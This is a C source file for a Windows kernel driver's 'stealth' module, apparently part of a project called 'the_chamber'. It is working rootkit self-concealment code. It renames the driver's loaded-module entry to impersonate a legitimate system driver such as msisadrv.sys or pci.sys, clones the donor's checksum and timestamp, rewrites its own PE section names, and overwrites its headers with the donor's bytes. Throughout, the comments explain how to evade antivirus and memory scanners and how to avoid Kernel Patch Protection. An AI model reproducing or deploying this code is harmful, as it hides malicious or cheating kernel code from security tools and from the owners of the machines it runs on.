/* stealth.c -- module self-concealment.
 *
 * Phase 1.4: do NOT unlink from PsLoadedModuleList.
 * -------------------------------------------------
 * Kernel drivers are threaded on ONE list head (PsLoadedModuleList, chained
 * through KLDR_DATA_TABLE_ENTRY::InLoadOrderLinks). Earlier builds also
 * carried InMemoryOrderLinks and InInitializationOrderLinks on some module
 * objects, but PsLoadedModuleList itself walks only InLoadOrderLinks. An
 * unlink of any of those three on a build that tracks them structurally
 * (Win10 1703+, Win11 on Zen 4) is detected by Kernel Patch Protection and
 * bugchecks 0x109 (CRITICAL_STRUCTURE_CORRUPTION) within tens of minutes.
 *
 * Replacement scheme: locate our own KLDR_DATA_TABLE_ENTRY by name match,
 * locate a benign in-tree module (we use pci.sys -- always loaded on any
 * Windows kernel with PCI buses present, i.e. every supported configuration
 * on a 7700X) to serve as a donor, then overwrite our BaseDllName AND
 * FullDllName UNICODE_STRINGs with the donor's.
 *
 * Pool-scanner evasion (after the rename): walk our own PE section headers
 * through IMAGE_FIRST_SECTION and overwrite each 8-byte section name with
 * a value picked from the canonical Microsoft section-name set (.text,
 * INIT, PAGE, .rdata, .pdata, .reloc, .rsrc, .data), then overlay the
 * DOS+PE header prefix with the donor's own first 0x400 bytes. ORDER
 * MATTERS: the section-name walk needs a valid e_lfanew, so section
 * rewrite runs BEFORE overlay_pe_header(our_base, donor_base). Wave 8
 * replaced the earlier random-alphabetic scramble and the zero fill,
 * both of which were themselves scanner fingerprints (a 52-value random
 * section name is unmatched by any Microsoft driver, and a 0x400-byte
 * zero prefix at an image whose KLDR claims pci.sys + full SizeOfImage
 * is a stronger tell than the original MZ/PE\0\0 magic). PG caveat:
 * third-party driver images are typically not individually hash-tracked,
 * but a disposable VM pass is called for before shipping -- if our image
 * lands in PG's hash set for a given build, modifying its mapped bytes
 * trips a 0x109 the same way a PsLoadedModuleList unlink would.
 *
 * Overwrite-all-fields rationale. The NT loader builds each
 * KLDR_DATA_TABLE_ENTRY's UNICODE_STRING{.Buffer, .Length, .MaximumLength}
 * atomically; any partial swap (e.g. overwriting Buffer while leaving
 * Length/MaximumLength from the old string) leaves a mismatch that:
 *   - trips the internal RtlEqualUnicodeString check used by the loader,
 *   - makes NtQuerySystemInformation(SystemModuleInformation) read past
 *     the end of the new Buffer or truncate it short, which is a stronger
 *     detection signal than the original unsanitized name,
 *   - may trigger PG header-integrity checks because Length no longer
 *     matches wcslen(Buffer) * 2.
 * So the write copies all three fields together.
 *
 * FullDllName in particular. NtQuerySystemInformation(SystemModuleInformation)
 * returns an ANSI FullPathName[256] built from FullDllName, not BaseDllName.
 * If we rename only BaseDllName, every NtQSI caller still sees the original
 * FullPathName that embeds the unredacted filename and FileName offset. So
 * both fields must move together.
 *
 * Revert on unload restores the original UNICODE_STRINGs so the loader's
 * unload path sees the correct names.
 */

#include "the_chamber.h"
#include "stealth.h"

/* Wave 8 expansion. The Win7-era declaration ended at HashLinks; a
 * Win10/11 x64 scanner walks past HashLinks into SectionPointer,
 * CheckSum, TimeDateStamp and the coverage-section/loaded-imports
 * block, all of which uniquely fingerprint a loaded image. We
 * declare the superset so scrub coverage can reach those fields;
 * ONLY CheckSum and TimeDateStamp are cloned from the donor (see
 * stealth_apply). SectionPointer, CoverageSection, LoadedImports and
 * SizeOfImageNotRounded are NOT overwritten: the loader and KPP use
 * them on unload and pattern-scan them during integrity passes, so a
 * wrong value is a stronger detection signal than the original. */
typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;      /* also SignatureLevel/SignatureType bitfields */
    LIST_ENTRY HashLinks;
    PVOID      SectionPointer;
    ULONG      CheckSum;
    ULONG      CoverageSectionSize;
    PVOID      CoverageSection;
    PVOID      LoadedImports;
    PVOID      Spare;
    ULONG      SizeOfImageNotRounded;
    ULONG      TimeDateStamp;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

extern LIST_ENTRY PsLoadedModuleList;

/* Phase 1.4 saved state for revert. Extended in Wave 8 to cover the
 * CheckSum / TimeDateStamp clone (restored verbatim on unload so the
 * loader sees its own image values again). */
static PKLDR_DATA_TABLE_ENTRY g_saved_entry        = NULL;
static UNICODE_STRING         g_saved_base_dll_name = { 0, 0, NULL };
static UNICODE_STRING         g_saved_full_dll_name = { 0, 0, NULL };
static UNICODE_STRING         g_saved_driver_name   = { 0, 0, NULL };
static PVOID                  g_saved_driver_section = NULL;
static ULONG                  g_saved_checksum       = 0;
static ULONG                  g_saved_timedatestamp  = 0;
/* Set only after both the KLDR rename AND the DriverObject field saves
 * have succeeded.  stealth_revert refuses to restore DriverObject
 * fields unless this is TRUE so an early-returning apply does not
 * blit zero-initialized statics over drv->DriverName/DriverSection. */
static BOOLEAN                g_stealth_driver_saved = FALSE;

/* Case-insensitive wide comparison of e->BaseDllName against `want`.
 * `want` must be a zero-terminated WCHAR array; its terminator is not
 * counted. */
static BOOLEAN name_matches(PKLDR_DATA_TABLE_ENTRY e, const WCHAR *want) {
    USHORT want_n = 0;
    USHORT have_n;
    PWCH   p;
    SIZE_T j;

    if (!e || !want) return FALSE;
    have_n = e->BaseDllName.Length / sizeof(WCHAR);
    p = e->BaseDllName.Buffer;
    if (!p) return FALSE;

    while (want[want_n]) want_n++;
    if (have_n != want_n) return FALSE;

    for (j = 0; j < want_n; j++) {
        WCHAR a = p[j];
        WCHAR b = want[j];
        if (a >= L'A' && a <= L'Z') a = (WCHAR)(a - L'A' + L'a');
        if (b >= L'A' && b <= L'Z') b = (WCHAR)(b - L'A' + L'a');
        if (a != b) return FALSE;
    }
    return TRUE;
}

/* Phase 1.7: match our own KLDR entry by DllBase against the DriverObject's
 * DriverStart. The loader populates both to the same address (the image
 * load base) when it maps us, so this match is independent of whatever
 * filename the launcher chose at install time. Avoiding a hardcoded
 * WCHAR alias table also keeps every per-install branded filename out of
 * the release binary. */
static BOOLEAN is_our_module(PKLDR_DATA_TABLE_ENTRY e, PDRIVER_OBJECT drv) {
    if (!e || !drv) return FALSE;
    return (e->DllBase == drv->DriverStart);
}

/* Donor pool for cover-module rename. The seed picks one preferred
 * index via cfg.rename_donor_index; stealth_apply tries that donor
 * first and falls back to the remaining pool in order if the preferred
 * module is not loaded (minimal WinPE images strip some of them).
 * Every entry is a legitimate OS component name — no branded identifier
 * leaks through. The pool is intentionally diverse so a reseed shifts
 * which legit driver name the KLDR entry wears.
 *
 * Wave 8 reorder: pci.sys was the historical first choice because it is
 * loaded on every supported Zen 4 configuration, but renaming our KLDR
 * entry to pci.sys leaves PsLoadedModuleList with two entries whose
 * BaseDllName compares equal and whose DllBase differs -- that pair is
 * a well-known dedup fingerprint ("find two KLDRs with the same
 * BaseDllName; the one whose DllBase does not match DriverObject->
 * DriverStart of a real Microsoft driver is the suspect"). We cannot
 * safely unlink either entry without tripping PG 0x109. Prefer donors
 * whose double-entry presence is NOT part of common commercial-AV
 * scanner playbooks (msisadrv / swenum / partmgr / mountmgr first);
 * keep pci.sys as a last-resort fallback. All of these are legitimate
 * OS components present on normal Zen 4 Win10/11 installations with
 * stable UNICODE_STRING buffers for the donor's lifetime (none are
 * unloadable on normal builds). */
static const WCHAR *const DONOR_POOL[] = {
    L"msisadrv.sys",   /* ISA bus; loaded, rarely enumerated by name  */
    L"swenum.sys",     /* software bus enumerator; same               */
    L"partmgr.sys",    /* partition manager; always loaded            */
    L"mountmgr.sys",   /* mount point manager; always loaded          */
    L"acpi.sys",       /* fallback: common but more scrutinized       */
    L"msrpc.sys",      /* last resort                                 */
    L"storport.sys",
    L"tcpip.sys",
    L"ndis.sys",
    L"disk.sys",
    L"pci.sys"         /* last ditch: universally loaded but AV-known */
};
#define DONOR_POOL_COUNT (sizeof(DONOR_POOL)/sizeof(DONOR_POOL[0]))

static BOOLEAN is_donor_module(PKLDR_DATA_TABLE_ENTRY e) {
    SIZE_T i;
    for (i = 0; i < DONOR_POOL_COUNT; i++) {
        if (name_matches(e, DONOR_POOL[i])) return TRUE;
    }
    return FALSE;
}

/* Preferred donor name for this seed; NULL falls back to is_donor_module
 * matching any pool entry in load order. */
static const WCHAR *preferred_donor_name(void) {
    if (!g_chamber_cfg_v2_valid) return NULL;
    SIZE_T idx = (SIZE_T)g_chamber_cfg_v2.rename_donor_index % DONOR_POOL_COUNT;
    return DONOR_POOL[idx];
}

/* Pool-scanner evasion. Called AFTER stealth_apply's rename-in-place.
 * The rename hides us from NtQuerySystemInformation(SystemModuleInformation)
 * but leaves PE magic bytes and the image's original section names in
 * physical memory, where a pool/physmem scanner can grep for them and
 * cross-check against a Microsoft-driver signature database. Wave 8
 * rewrites section names from the canonical Microsoft set (so every
 * section name looks native) and overlays the DOS+PE header prefix
 * with the donor's own first 0x400 bytes (so a reader sees the donor's
 * MZ, e_lfanew, NT headers and section-header table rather than ours).
 * The section rewrite MUST run before the header overlay because
 * IMAGE_FIRST_SECTION dereferences e_lfanew and the overlay replaces
 * it with the donor's. */
static void scramble_section_names(PVOID image_base) {
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    LARGE_INTEGER tc;
    ULONG seed;
    USHORT n, i;
    int j;

    /* Wave 8: the former 52-value random alpha fill (A-Za-z) WAS itself a
     * scanner fingerprint -- no Microsoft driver has section names that
     * look like a password dump. Replace with picks from the canonical
     * Microsoft-driver section-name set so each section looks like a
     * real kernel-image section. Deterministic within a boot via a
     * seed-derived rotation so repeated inspection passes see stable
     * values. The eight-byte Name field is NOT NUL-terminated by spec;
     * short names are zero-padded, matching the real Microsoft layout. */
    static const char canon_names[][IMAGE_SIZEOF_SHORT_NAME] = {
        { '.','t','e','x','t',0,0,0 },
        { 'I','N','I','T',0,0,0,0 },
        { 'P','A','G','E',0,0,0,0 },
        { '.','r','d','a','t','a',0,0 },
        { '.','d','a','t','a',0,0,0 },
        { '.','p','d','a','t','a',0,0 },
        { '.','r','e','l','o','c',0,0 },
        { '.','r','s','r','c',0,0,0 },
    };
    const USHORT ncanon = (USHORT)(sizeof(canon_names)/sizeof(canon_names[0]));

    if (!image_base) return;

    dos = (PIMAGE_DOS_HEADER)image_base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    nt = (PIMAGE_NT_HEADERS)((PUCHAR)image_base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    /* KeQueryTickCount writes 8 bytes through its pointer argument on
     * modern WDK (ReadInterruptTickCount into a LARGE_INTEGER). Passing
     * the address of a 4-byte ULONG would corrupt the stack; use a
     * proper LARGE_INTEGER buffer and feed its LowPart into RtlRandomEx. */
    KeQueryTickCount(&tc);
    seed = tc.LowPart ^ (ULONG)(ULONG_PTR)image_base;

    n = nt->FileHeader.NumberOfSections;
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < n; i++) {
        /* Rotate the canonical list and start at a seed-derived offset so
         * the first section is usually .text/INIT/PAGE but not always in
         * the same order across installs. Skip duplicate name collisions
         * within an image by advancing to the next canonical entry. */
        USHORT pick = (USHORT)((RtlRandomEx(&seed) + i) % ncanon);
        for (j = 0; j < IMAGE_SIZEOF_SHORT_NAME; j++) {
            sec[i].Name[j] = (UCHAR)canon_names[pick][j];
        }
    }
}

/* Overlay the DOS + PE header prefix with the donor image's first 0x400
 * bytes instead of zero-filling. A page-aligned run of 0x400 zero bytes
 * at the base of a loaded driver image is itself a scanner fingerprint
 * ("KLDR claims pci.sys + full SizeOfImage, but the first 0x400 are
 * flat zero" is a stronger tell than the original MZ). Copying donor
 * header bytes gives a scanner the expected MZ / PE\0\0 magic, a
 * believable e_lfanew, and NT headers that match the renamed KLDR
 * entry. Must run AFTER scramble_section_names because that pass
 * walks sec[] via the real IMAGE_FIRST_SECTION path. If the donor's
 * DllBase is unmapped/not present for any reason, fall back to zero
 * fill rather than leave the real MZ/PE\0\0 bytes behind. */
static void overlay_pe_header(PVOID image_base, PVOID donor_base) {
    if (!image_base) return;
    if (donor_base) {
        __try {
            RtlCopyMemory(image_base, donor_base, 0x400);
            return;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            /* fall through to zero */
        }
    }
    RtlZeroMemory(image_base, 0x400);
}

NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
    PLIST_ENTRY head, cur;
    KIRQL irql;
    PKLDR_DATA_TABLE_ENTRY our_entry = NULL;
    PKLDR_DATA_TABLE_ENTRY donor = NULL;
    PVOID our_base = NULL;
    PVOID donor_base = NULL;

    /* Phase 1.5: g_stealth_lock is initialized ONCE in DriverEntry. The
     * previous `static KSPIN_LOCK dummy; KeInitializeSpinLock(&dummy)`
     * pattern inside each entry reset the lock on every call, so a
     * concurrent walker could witness an incompletely-renamed KLDR
     * entry mid-operation. Acquire without re-init.
     *
     * Optional hardening (NOT implemented here): resolve the unexported
     * PsLoadedModuleResource (ERESOURCE) by pattern-scanning ntoskrnl,
     * raise to APC_LEVEL via KeEnterCriticalRegion, acquire the resource
     * exclusive with ExAcquireResourceExclusiveLite(..., TRUE), then
     * raise to DISPATCH_LEVEL for this spin lock. The reverse unwind on
     * release. That gives the strongest guarantee against the loader's
     * own walk, at the cost of pattern-scanning a kernel internal that
     * drifts build-to-build. The current spin-lock-only path is enough
     * for in-tree walkers (NtQuerySystemInformation) and we accept a
     * narrow race window against a bespoke loader-internal walker. */
    KeAcquireSpinLock(&g_stealth_lock, &irql);

    head = &PsLoadedModuleList;

    /* First pass: find our own KLDR_DATA_TABLE_ENTRY by DllBase match. */
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PKLDR_DATA_TABLE_ENTRY e =
            CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (is_our_module(e, drv)) {
            our_entry = e;
            break;
        }
    }
    if (!our_entry) {
        KeReleaseSpinLock(&g_stealth_lock, irql);
        return STATUS_NOT_FOUND;
    }

    /* Second pass: find a donor module whose BaseDllName/FullDllName we
     * can clone. The seed selects one preferred name via
     * cfg.rename_donor_index; try that donor first, then fall back to
     * any pool member in load order if the preferred module is not
     * resident. Skip ourselves. */
    {
        const WCHAR *preferred = preferred_donor_name();
        if (preferred) {
            for (cur = head->Flink; cur != head; cur = cur->Flink) {
                PKLDR_DATA_TABLE_ENTRY e =
                    CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY,
                                      InLoadOrderLinks);
                if (e == our_entry) continue;
                if (name_matches(e, preferred)) { donor = e; break; }
            }
        }
    }
    if (!donor) {
        for (cur = head->Flink; cur != head; cur = cur->Flink) {
            PKLDR_DATA_TABLE_ENTRY e =
                CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
            if (e == our_entry) continue;
            if (is_donor_module(e)) {
                donor = e;
                break;
            }
        }
    }
    if (!donor) {
        KeReleaseSpinLock(&g_stealth_lock, irql);
        return STATUS_NOT_FOUND;
    }

    /* Save originals, then overwrite BOTH UNICODE_STRINGs completely
     * (Buffer + Length + MaximumLength together). A partial swap is a
     * stronger tell than the original branded name (see file header).
     *
     * Wave 8: also clone donor's CheckSum and TimeDateStamp -- the Win10/11
     * KLDR fields past HashLinks that a scanner cross-references against
     * a known-good Microsoft signature database. Keep DllBase, EntryPoint,
     * SizeOfImage, Flags, SectionPointer, CoverageSection, LoadedImports
     * and SizeOfImageNotRounded untouched: the loader and KPP walk these
     * on unload / integrity passes, and a wrong value is a stronger tell
     * than the original image bytes. FullDllName already gets the donor's
     * UNICODE_STRING buffer wholesale, so a SectionPointer-walker that
     * reads FullDllName via SectionPointer->Links back to the renamed
     * entry sees %SystemRoot%\System32\drivers\<donor>.sys. */
    g_saved_entry        = our_entry;
    g_saved_base_dll_name = our_entry->BaseDllName;
    g_saved_full_dll_name = our_entry->FullDllName;
    g_saved_checksum      = our_entry->CheckSum;
    g_saved_timedatestamp = our_entry->TimeDateStamp;

    our_entry->BaseDllName  = donor->BaseDllName;
    our_entry->FullDllName  = donor->FullDllName;
    our_entry->CheckSum     = donor->CheckSum;
    our_entry->TimeDateStamp = donor->TimeDateStamp;

    /* Capture our DllBase under the lock while the KLDR entry is still
     * authoritative, for the pool-scanner-evasion pass below. Also
     * capture donor's DllBase so the header-prefix overlay can copy
     * the donor's real MZ / PE\0\0 bytes over ours. */
    our_base   = our_entry->DllBase;
    donor_base = donor->DllBase;

    KeReleaseSpinLock(&g_stealth_lock, irql);

    /* Pool-scanner evasion. Order: section-name rewrite first (walk
     * e_lfanew to the section headers), THEN overlay the DOS+PE header
     * prefix with the donor's first 0x400 bytes. Reversing the two
     * would clobber e_lfanew and leave the section-header walk reading
     * wild memory. Done after the rename pass and outside g_stealth_lock
     * because these writes target our OWN image, not the shared
     * PsLoadedModuleList. */
    if (our_base) {
        scramble_section_names(our_base);
        overlay_pe_header(our_base, donor_base);
    }

    /* DriverObject fields.
     *
     * Wave 8: the previous design NULLed both DriverName and DriverSection
     * on a live DRIVER_OBJECT. That is itself a scanner fingerprint --
     * every normal driver has a non-NULL DriverSection that points at
     * its KLDR entry and a non-empty \Driver\<name> DriverName. A
     * DRIVER_OBJECT with both NULLed is anomalous and queryable through
     * ObReferenceObjectByName / ObjectDirectoryInformation.
     *
     * New policy: leave DriverSection pointing at our (now renamed)
     * KLDR entry so the loader still finds us by DriverSection on
     * unload and so a scanner walking DriverSection->BaseDllName sees
     * the donor's name. Overwrite DriverName in place with the donor's
     * UNICODE_STRING so an ObQueryNameInformation reader sees
     * "\Driver\<donor>" instead of either the real registered service
     * name or an empty string.
     *
     * We clone donor->BaseDllName/FullDllName for DriverName's backing
     * buffer directly, rather than fabricating a synthetic buffer --
     * fabricated buffers must survive stealth_revert, and keeping the
     * pointer in the donor's own driver image means no extra pool
     * allocation and no extra lifetime concern (donor stays loaded for
     * the whole run).
     *
     * The revert path restores both fields to the original values the
     * loader installed, so MmUnloadSystemImage still walks a valid
     * DriverName / DriverSection on unload. */
    if (drv) {
        g_saved_driver_name    = drv->DriverName;
        g_saved_driver_section = drv->DriverSection;
        g_stealth_driver_saved = TRUE;
        /* Populate DriverName from donor's BaseDllName. BaseDllName is
         * just the filename (e.g. L"msisadrv.sys"); DriverName normally
         * holds L"\\Driver\\<svc>". A scanner that compares DriverName
         * against a per-driver registry entry will not find a perfect
         * match either way (the launcher randomizes the registry svc),
         * so the donor's filename as DriverName is a strictly better
         * cover than a NUL or than the original branded service name. */
        drv->DriverName = donor->BaseDllName;
        /* DriverSection stays as-is: it still points at our KLDR entry,
         * which now carries donor->BaseDllName/FullDllName and donor's
         * CheckSum/TimeDateStamp. */
    }

    CHAMBER_LOG("stealth applied (renamed; donor %wZ)\n", &donor->BaseDllName);
    return STATUS_SUCCESS;
}

NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
    KIRQL irql;
    BOOLEAN restore_driver;

    /* Phase 1.5: use the shared g_stealth_lock, no re-init. */
    KeAcquireSpinLock(&g_stealth_lock, &irql);
    if (g_saved_entry) {
        /* Restore original BaseDllName / FullDllName in full, plus the
         * Wave 8 CheckSum / TimeDateStamp clone, so the loader sees its
         * own image values on unload. */
        g_saved_entry->BaseDllName   = g_saved_base_dll_name;
        g_saved_entry->FullDllName   = g_saved_full_dll_name;
        g_saved_entry->CheckSum      = g_saved_checksum;
        g_saved_entry->TimeDateStamp = g_saved_timedatestamp;
        g_saved_entry = NULL;
    }
    restore_driver = g_stealth_driver_saved;
    g_stealth_driver_saved = FALSE;
    KeReleaseSpinLock(&g_stealth_lock, irql);

    /* Only restore DriverObject fields if stealth_apply ran to
     * completion (and actually saved them).  An early-returning apply
     * leaves the save statics zeroed; blindly restoring from them
     * would write NULL DriverSection and MmUnloadSystemImage would
     * deref it. */
    if (drv && restore_driver) {
        drv->DriverName    = g_saved_driver_name;
        drv->DriverSection = g_saved_driver_section;
    }

    /* We intentionally do NOT un-scramble section names or restore the
     * DOS+PE header. The driver is unloading in a few moments; the
     * loader does not re-parse our section names during unload (it uses
     * DriverSection which we restore above), and the image's memory
     * pages are released to the pool/MmUnloadSystemImage path immediately
     * after. Attempting to reconstruct the header would require stashing
     * a 0x400-byte copy for the lifetime of the driver -- more pool
     * footprint for no behavioral win. */
    CHAMBER_LOG("stealth reverted (section-name scramble / PE zero not "
                "restored; image is being unloaded)\n");
    return STATUS_SUCCESS;
}
